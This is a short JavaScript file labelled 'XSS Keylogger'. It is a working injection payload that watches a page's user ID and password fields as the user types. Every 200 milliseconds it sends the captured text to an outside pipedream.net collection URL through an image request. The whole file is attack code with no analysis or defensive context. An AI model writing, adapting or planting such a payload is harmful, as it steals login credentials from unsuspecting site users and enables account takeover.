// XSS Keylogger
var keys = "";
var hackUrl = "https://eobws14x5y95evd.m.pipedream.net?keys=";

var login_id_element = document.getElementById("user_id");
login_id_element.addEventListener("input", function (event) {
    keys += event.target.value;
    keys += "|";
});

var login_pw_element = document.getElementById("user_pw");
login_pw_element.addEventListener("input", function (event) {
    keys += event.target.value;
    keys += "|";

});

setInterval(() => {
    if (keys !== "") {
        new Image().src = `${hackUrl}${encodeURIComponent(keys)}`;
        keys = "";
    }
}, 200);
